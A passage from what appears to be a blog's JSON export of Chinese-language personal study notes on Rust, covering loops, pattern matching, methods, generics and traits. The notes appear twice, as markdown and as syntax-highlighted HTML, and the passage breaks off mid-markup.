v);\n}\n\n// 无限循环 等价于while(true)\nloop {\n   println!(\"again!\");\n}\n~~~\n\n> 值得注意的是，rust的break既可以单独使用，也可以让他返回一个值\n>\n> loop是一个表达式，因而可以返回一个值\n\n## 模式匹配\n\n> 画重点，rust的模式匹配非常强大，以至于其他语言都在抄\n\n### match\n\n~~~rust\n// 这里是比较类似于其他语言switch的用法\n// 但match比switch强大得多\nenum Coin {\n    Penny,\n    Nickel,\n    Dime,\n    Quarter,\n}\n\nfn value_in_cents(coin: Coin) -> u8 {\n    match coin {\n        Coin::Penny =>  {\n            println!(\"Lucky penny!\");\n            1\n        },\n        Coin::Nickel => 5,\n        Coin::Dime => 10,\n        Coin::Quarter => 25,\n    }\n}\n\n// match是一个表达式，可以用来赋值\nenum IpAddr {\n   Ipv4,\n   Ipv6\n}\n\nfn main() {\n    let ip1 = IpAddr::Ipv6;\n    let ip_str = match ip1 {\n        IpAddr::Ipv4 => \"127.0.0.1\",\n        _ => \"::1\",\n    };\n\n    println!(\"{}\", ip_str);\n}\n\n// 模式绑定 （有点像解构）\nenum Coin {\n    Penny,\n    Nickel,\n    Dime,\n    Quarter(UsState), // 25美分硬币\n}\n\nfn value_in_cents(coin: Coin) -> u8 {\n    match coin {\n        Coin::Penny => 1,\n        Coin::Nickel => 5,\n        Coin::Dime => 10,\n        // 这里可以通过这样的写法直接拿到state\n        Coin::Quarter(state) => {\n            println!(\"State quarter from {:?}!\", state);\n            25\n        },\n    }\n}\n\n// 有时会遇到只有一个模式的值需要被处理，其它值直接忽略的场景，如果用 match 来处理就要写成下面这样\nlet v = Some(3u8);\nmatch v {\n   Some(3) => println!(\"three\"),\n   _ => (),\n}\n\n// 这种情况下可以直接用语法糖简化\nif let Some(3) = v {\n    println!(\"three\");\n}\n~~~\n\n> match的匹配必须穷尽所有的情况，也就是如果不列出所有的可能，必须定义_ =>分支\n\n### matches!宏\n\n> 跟java中的String#matches比较类似，如果我只是想知道某个实例是否匹配上了我给与的模式，可以不用特意去macth,直接调用matches!宏。\n\n~~~rust\n// 使用match\nlet foo = 'f';\nlet matched = match foo {\n    'A'..'Z' | 'a'..'z' => true,\n    _ => false,\n}\n\n// 使用matches!\nlet foo = 'f';\nlet matched = matches!(foo, 'A'..'Z' | 'a'..'z');\n~~~\n\n### 解构\n\n解构其实也是模式匹配实现的，在上一节笔记中已经写过了，不做详细介绍\n\n### 匹配守卫\n\n> 在要匹配的模式后面可以加上if condition，来对模式匹配进行进一步限制\n\n~~~rust\nfn main() {\n    let x = Some(5);\n    let y = 10;\n\n    match x {\n        Some(50) => println!(\"Got 50\"),\n        Some(n) if n == y => println!(\"Matched, n = {}\", n),\n        _ => println!(\"Default case, x = {:?}\", x),\n    }\n\n    println!(\"at the end: x = {:?}, y = {}\", x, y);\n}\n~~~\n\n> **匹配守卫的条件会作用于所有的模式**\n\n~~~rust\nlet x = 4;\nlet y = false;\n\nmatch x {\n    4 | 5 | 6 if y => println!(\"yes\"),\n    _ => println!(\"no\"),\n}\n~~~\n\n> 这个例子中看起来好像 `if y` 只作用于 `6`，但实际上匹配守卫 `if y` 作用于 `4`、`5` **和** `6` ，在满足 `x` 属于 `4 | 5 | 6` 后才会判断 `y` 是否为 `true`：\n\n### @绑定\n\n> 说白了就是我们即想要模式匹配，匹配成功后又想通过解构的形式拿到对应的值\n>\n> 小孩子才做选择 大人全都要！\n\n~~~rust\nenum Message {\n    Hello { id: i32 },\n}\n\nlet msg = Message::Hello { id: 5 };\n\nmatch msg {\n    Message::Hello { id: id_variable @ 3..=7 } => {\n        println!(\"Found an id in range: {}\", id_variable)\n    },\n    Message::Hello { id: 10..=12 } => {\n        println!(\"Found an id in another range\")\n    },\n    Message::Hello { id } => {\n        println!(\"Found some other id: {}\", id)\n    },\n}\n~~~\n\n上面这个例子的第一个分支中，我们既通过解构拿到了id，又对他进行了模式匹配: 在3..=7范围内才能通过。\n\n注意:\n\n> 考虑下面一段代码:\n>\n> ```rust\n> fn main() {\n>     match 1 {\n>         num @ 1 | 2 => {\n>             println!(\"{}\", num);\n>         }\n>         _ => {}\n>     }\n> }\n> ```\n>\n> 编译不通过，是因为 `num` 没有绑定到所有的模式上，只绑定了模式 `1`，你可能会试图通过这个方式来解决：\n>\n> ```rust\n> num @ (1 | 2)\n> ```\n>\n> 但是，如果你用的是 Rust 1.53 之前的版本，那这种写法会报错，因为编译器不支持。\n\n## 方法\n\nRust使用`impl`块来定义方法，多说无益，先来一段示例代码\n\n~~~rust\nstruct Circle {\n    x: f64,\n    y: f64,\n    radius: f64,\n}\n\nimpl Circle {\n    // new是Circle的关联函数，因为它的第一个参数不是self\n    // 这种方法往往用于初始化当前结构体的实例\n    fn new(x: f64, y: f64, radius: f64) -> Circle {\n        Circle {\n            x: x,\n            y: y,\n            radius: radius,\n        }\n    }\n\n    // Circle的方法，&self表示借用当前的Circle结构体\n    fn area(&self) -> f64 {\n        std::f64::consts::PI * (self.radius * self.radius)\n    }\n}\n~~~\n\n与java的不同在于，要实现一个类似于java类的结构，我们需要定义struct和它的impl，相当于字段的声明和方法的声明被分开了。\n\n并且，impl可以有很多个\n\n~~~rust\nstruct Circle {\n    x: f64,\n    y: f64,\n    radius: f64,\n}\n\nimpl Circle {\n    fn new(x: f64, y: f64, radius: f64) -> Circle {\n        Circle {\n            x: x,\n            y: y,\n            radius: radius,\n        }\n    }\n}\n\nimpl Circle {\n    fn area(&self) -> f64 {\n        std::f64::consts::PI * (self.radius * self.radius)\n    }\n}\n~~~\n\n这样做的好处在于可以让方法的声明更加清晰，我们可以把为完成同一种职能的方法声明在一个impl块中，这样比起塞在一块会有条理得多。\n\n### 关联函数&方法\n\n看到`函数`和`方法`二字我们便可以知晓他们的不同。函数不会绑定在一个对象上，而方法会。\n\n我们先来看一下如何声明关联函数与方法\n\n~~~rust\nstruct Circle {\n    x: f64,\n    y: f64,\n    radius: f64,\n}\n\nimpl Circle {\n    // new是Circle的关联函数，因为它的第一个参数不是self\n    // 这种方法往往用于初始化当前结构体的实例\n    fn new(x: f64, y: f64, radius: f64) -> Circle {\n        Circle {\n            x: x,\n            y: y,\n            radius: radius,\n        }\n    }\n\n    // Circle的方法，&self表示借用当前的Circle结构体\n    fn area(&self) -> f64 {\n        std::f64::consts::PI * (self.radius * self.radius)\n    }\n}\n~~~\n\n可以看到，所谓的方法，就是传入了一个`&self`的函数，这是一个语法糖，实际上是 `self: &Self` 的简写。意思是我们传入了一个这个类型的实例的引用。这样在调用时便可以直接`circle.area()`。\n\n而没有传入自身引用的关联函数又是什么呢？我只说四个字——**静态方法**。\n\n### 为枚举实现方法\n\n~~~rust\n#![allow(unused)]\nfn main() {\nenum Message {\n    Quit,\n    Move { x: i32, y: i32 },\n    Write(String),\n    ChangeColor(i32, i32, i32),\n}\n\nimpl Message {\n    fn call(&self) {\n        // 在这里定义方法体\n    }\n}\n\n\tlet m = Message::Write(String::from(\"hello\"));\n\tm.call();\n}\n~~~\n\n## 泛型&特征(trait)\n\n### 声明一个基础的泛型\n\n~~~rust\nfn add<T>(a:T, b:T) -> T {\n    a + b\n}\n\nfn main() {\n    println!(\"add i8: {}\", add(2i8, 3i8));\n    println!(\"add i32: {}\", add(20, 30));\n    println!(\"add f64: {}\", add(1.23, 1.23));\n}\n~~~\n\n当然可以看出来，这串代码是跑不了的，不是所有类型都允许相加的\n\n### 使用trait约束泛型的类型\n\n那我们就尝试对他的类型进行约束\n\n这里语法比较类似kotlin\n\n~~~rust\nfn add<T: std::ops::Add<Output = T>>(a:T, b:T) -> T {\n    a + b\n}\n~~~\n\n这里的`std::ops::Add<Output = T>`是不是比较类似于kotlin的接口？在rust中它叫做`trait `,特征。而实现了`std::ops::Add<Output = T>`,就支持了相加，泛型output就是相加后结果的类型。\n\n> 这些都说明一个道理，特征定义了**一个可以被共享的行为，只要实现了特征，你就能使用该行为**。\n\n### 在枚举中使用泛型\n\n~~~rust\nenum Option<T> {\n    Some(T),\n    None,\n}\n\nenum Result<T, E> {\n    Ok(T),\n    Err(E),\n}\n~~~\n\n### 在方法中使用泛型\n\n~~~rust\nstruct Point<T> {\n    x: T,\n    y: T,\n}\n\nimpl<T> Point<T> {\n    fn x(&self) -> &T {\n        &self.x\n    }\n}\n\nfn main() {\n    let p = Point { x: 5, y: 10 };\n\n    println!(\"p.x = {}\", p.x());\n}\n~~~\n\n> 这个例子中，`T,U` 是定义在结构体 `Point` 上的泛型参数，`V,W` 是单独定义在方法 `mixup` 上的泛型参数，它们并不冲突，说白了，你可以理解为，一个是结构体泛型，一个是函数泛型。\n\n### 为具体的泛型类型实现方法\n\n> 对于 `Point<T>` 类型，你不仅能定义基于 `T` 的方法，还能针对特定的具体类型，进行方法定义：\n>\n> ```rust\n> impl Point<f32> {\n>     fn distance_from_origin(&self) -> f32 {\n>         (self.x.powi(2) + self.y.powi(2)).sqrt()\n>     }\n> }\n> ```\n>\n> 这段代码意味着 `Point<f32>` 类型会有一个方法 `distance_from_origin`，而其他 `T` 不是 `f32` 类型的 `Point<T> `实例则没有定义此方法。这个方法计算点实例与坐标`(0.0, 0.0)` 之间的距离，并使用了只能用于浮点型的数学运算符。\n>\n> 这样我们就能针对特定的泛型类型实现某个特定的方法，对于其它泛型类型则没有定义该方法。\n\n### const 泛型\n\n~~~rust\nfn display_array<T: std::fmt::Debug>(arr: &[T]) {\n    println!(\"{:?}\", arr);\n}\nfn main() {\n    let arr: [i32; 3] = [1, 2, 3];\n    display_array(&arr);\n\n    let arr: [i32;2] = [1,2];\n    display_array(&arr);\n}\n~~~\n\n首先看看这段代码，如果我们想要约束传入切片的大小该怎么做呢\n\nconst泛型其实就是针对常量值的泛型\n\n~~~rust\nfn display_array<T: std::fmt::Debug, const N: usize>(arr: [T; N]) {\n    println!(\"{:?}\", arr);\n}\nfn main() {\n    let arr: [i32; 3] = [1, 2, 3];\n    display_array(arr);\n\n    let arr: [i32; 2] = [1, 2];\n    display_array(arr);\n}\n~~~\n\n这里我们声明了一个常量泛型usize，这个usize可以放到入参处切片的类型中去，这便是常量泛型的用法。\n\n### 泛型的性能\n\n> 在 Rust 中泛型是零成本的抽象，意味着你在使用泛型时，完全不用担心性能上的问题。\n>\n> 但是任何选择都是权衡得失的，既然我们获得了性能上的巨大优势，那么又失去了什么呢？Rust 是在编译期为泛型对应的多个类型，生成各自的代码，因此损失了编译速度和增大了最终生成文件的大小。\n>\n> 具体来说：\n>\n> Rust 通过在编译时进行泛型代码的 **单态化**(*monomorphization*)来保证效率。单态化是一个通过填充编译时使用的具体类型，将通用代码转换为特定代码的过程。\n>\n> 编译器所做的工作正好与我们创建泛型函数的步骤相反，编译器寻找所有泛型代码被调用的位置并针对具体类型生成代码。\n\n## 特征(trait)\n\n其实对应的就是java的interface，不过似乎设计得更好\n\n### 定义特征\n\n~~~rust\npub trait Summary {\n    fn summarize(&self) -> String;\n    \n    // 允许有默认实现\n    // 默认实现中允许调用其他方法\n    fn summarize1(&self) -> String {\n        \"巴拉巴拉\" + self.summarize()\n    }\n}\n~~~\n\n### 为类型实现特征\n\n~~~rust\npub trait Summary {\n    fn summarize(&self) -> String;\n}\npub struct Post {\n    pub title: String, // 标题\n    pub author: String, // 作者\n    pub content: String, // 内容\n}\n\nimpl Summary for Post {\n    fn summarize(&self) -> String {\n        format!(\"文章{}, 作者是{}\", self.title, self.author)\n    }\n}\n\npub struct Weibo {\n    pub username: String,\n    pub content: String\n}\n\nimpl Summary for Weibo {\n    fn summarize(&self) -> String {\n        format!(\"{}发表了微博{}\", self.username, self.content)\n    }\n}\n~~~\n\n这样的设计让Rust实现Kotlin那样的拓展函数成为可能。\n\n### 孤儿原则\n\n> 上面我们将 `Summary` 定义成了 `pub` 公开的。这样，如果他人想要使用我们的 `Summary` 特征，则可以引入到他们的包中，然后再进行实现。\n>\n> 关于特征实现与定义的位置，有一条非常重要的原则：**如果你想要为类型 `A` 实现特征 `T`，那么 `A` 或者 `T` 至少有一个是在当前作用域中定义的！**。例如我们可以为上面的 `Post` 类型实现标准库中的 `Display` 特征，这是因为 `Post` 类型定义在当前的作用域中。同时，我们也可以在当前包中为 `String` 类型实现 `Summary` 特征，因为 `Summary` 定义在当前作用域中。\n>\n> 但是你无法在当前作用域中，为 `String` 类型实现 `Display` 特征，因为它们俩都定义在标准库中，其定义所在的位置都不在当前作用域，跟你半毛钱关系都没有，看看就行了。\n>\n> 该规则被称为**孤儿规则**，可以确保其它人编写的代码不会破坏你的代码，也确保了你不会莫名其妙就破坏了风马牛不相及的代码。\n\n### 形参约束\n\n~~~rust\npub fn notify(item: &impl Summary) {\n    println!(\"Breaking news! {}\", item.summarize());\n}\n\n// 多重约束\npub fn notify(item: &(impl Summary + Display)) {\n    //...\n}\n\n// 不使用where约束\nfn some_function<T: Display + Clone, U: Clone + Debug>(t: &T, u: &U) -> i32 {\n    //...\n}\n\n// 使用where约束\nfn some_function<T, U>(t: &T, u: &U) -> i32\n    where T: Display + Clone,\n          U: Clone + Debug\n{\n    //...\n}\n~~~\n\n> 虽然 `impl Trait` 这种语法非常好理解，但是实际上它只是一个语法糖：\n>\n> ```rust\n> pub fn notify<T: Summary>(item: &T) {\n>     println!(\"Breaking news! {}\", item.summarize());\n> }\n> ```\n\n// TODO","slug":"rust-note-#2","published":1,"updated":"2022-11-24T02:43:05.727Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtu002esfklfuouehul","content":"<h1 id=\"Rust笔记其二\"><a href=\"#Rust笔记其二\" class=\"headerlink\" title=\"Rust笔记其二\"></a>Rust笔记其二</h1><h2 id=\"流程控制\"><a href=\"#流程控制\" class=\"headerlink\" title=\"流程控制\"></a>流程控制</h2><p>比较类似go吧，if for这些后面跟的表达式都不用用括号包起来</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// 这里比较像kotlin，没有采用传统的三元运算符</span>\n<span class=\"token keyword\">let</span> condition <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> number <span class=\"token operator\">=</span> <span class=\"token keyword\">if</span> condition <span class=\"token punctuation\">{</span>\n        <span class=\"token number\">5</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token number\">6</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// 多分支</span>\n<span class=\"token keyword\">let</span> n <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> <span class=\"token number\">4</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is divisible by 4\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> <span class=\"token number\">3</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is divisible by 3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> n <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is divisible by 2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"number is not divisible by 4, 3, or 2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// for循环</span>\n<span class=\"token comment\">// 有点类似kt, 支持区间</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token number\">1</span><span class=\"token punctuation\">..=</span><span class=\"token number\">5</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{}\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 遍历集合</span>\n<span class=\"token comment\">// 注意所有权的转移，不取引用的话下面就用不了container了</span>\n<span class=\"token keyword\">for</span> item <span class=\"token keyword\">in</span> <span class=\"token operator\">&amp;</span>container <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 遍历时修改</span>\n<span class=\"token keyword\">for</span> item <span class=\"token keyword\">in</span> <span class=\"token operator\">&amp;</span><span class=\"token keyword\">mut</span> collection <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 遍历index和值</span>\n<span class=\"token keyword\">let</span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// `.iter()` 方法把 `a` 数组变成一个迭代器</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> a<span class=\"token punctuation\">.</span><span class=\"token function\">iter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">enumerate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"第{}个元素是{}\"</span><span class=\"token punctuation\">,</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 无限循环 等价于while(true)</span>\n<span class=\"token keyword\">loop</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"again!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>值得注意的是，rust的break既可以单独使用，也可以让他返回一个值</p>\n<p>loop是一个表达式，因而可以返回一个值</p>\n</blockquote>\n<h2 id=\"模式匹配\"><a href=\"#模式匹配\" class=\"headerlink\" title=\"模式匹配\"></a>模式匹配</h2><blockquote>\n<p>画重点，rust的模式匹配非常强大，以至于其他语言都在抄</p>\n</blockquote>\n<h3 id=\"match\"><a href=\"#match\" class=\"headerlink\" title=\"match\"></a>match</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// 这里是比较类似于其他语言switch的用法</span>\n<span class=\"token comment\">// 但match比switch强大得多</span>\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Coin</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Penny</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Nickel</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Dime</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Quarter</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">value_in_cents</span><span class=\"token punctuation\">(</span>coin<span class=\"token punctuation\">:</span> <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">u8</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">match</span> coin <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Penny</span> <span class=\"token operator\">=&gt;</span>  <span class=\"token punctuation\">{</span>\n            <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Lucky penny!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token number\">1</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Nickel</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Dime</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Quarter</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">25</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// match是一个表达式，可以用来赋值</span>\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">IpAddr</span> <span class=\"token punctuation\">{</span>\n   <span class=\"token class-name\">Ipv4</span><span class=\"token punctuation\">,</span>\n   <span class=\"token class-name\">Ipv6</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> ip1 <span class=\"token operator\">=</span> <span class=\"token class-name\">IpAddr</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Ipv6</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">let</span> ip_str <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span> ip1 <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">IpAddr</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Ipv4</span> <span class=\"token operator\">=&gt;</span> <span class=\"token string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span>\n        _ <span class=\"token operator\">=&gt;</span> <span class=\"token string\">\"::1\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{}\"</span><span class=\"token punctuation\">,</span> ip_str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 模式绑定 （有点像解构）</span>\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Coin</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Penny</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Nickel</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Dime</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Quarter</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">UsState</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// 25美分硬币</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">value_in_cents</span><span class=\"token punctuation\">(</span>coin<span class=\"token punctuation\">:</span> <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">u8</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">match</span> coin <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Penny</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Nickel</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Dime</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span>\n        <span class=\"token comment\">// 这里可以通过这样的写法直接拿到state</span>\n        <span class=\"token class-name\">Coin</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Quarter</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"State quarter from {:?}!\"</span><span class=\"token punctuation\">,</span> state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token number\">25</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 有时会遇到只有一个模式的值需要被处理，其它值直接忽略的场景，如果用 match 来处理就要写成下面这样</span>\n<span class=\"token keyword\">let</span> v <span class=\"token operator\">=</span> <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">3u8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">match</span> v <span class=\"token punctuation\">{</span>\n   <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n   _ <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 这种情况下可以直接用语法糖简化</span>\n<span class=\"token keyword\">if</span> <span class=\"token keyword\">let</span> <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>match的匹配必须穷尽所有的情况，也就是如果不列出所有的可能，必须定义_ =&gt;分支</p>\n</blockquote>\n<h3 id=\"matches-宏\"><a href=\"#matches-宏\" class=\"headerlink\" title=\"matches!宏\"></a>matches!宏</h3><blockquote>\n<p>跟java中的String#matches比较类似，如果我只是想知道某个实例是否匹配上了我给与的模式，可以不用特意去macth,直接调用matches!宏。</p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// 使用match</span>\n<span class=\"token keyword\">let</span> foo <span class=\"token operator\">=</span> <span class=\"token char string\">'f'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> matched <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span> foo <span class=\"token punctuation\">{</span>\n    <span class=\"token char string\">'A'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'Z'</span> <span class=\"token operator\">|</span> <span class=\"token char string\">'a'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'z'</span> <span class=\"token operator\">=&gt;</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n    _ <span class=\"token operator\">=&gt;</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 使用matches!</span>\n<span class=\"token keyword\">let</span> foo <span class=\"token operator\">=</span> <span class=\"token char string\">'f'</span><span class=\"token punctuation\">;</span>\n<span class=\"token 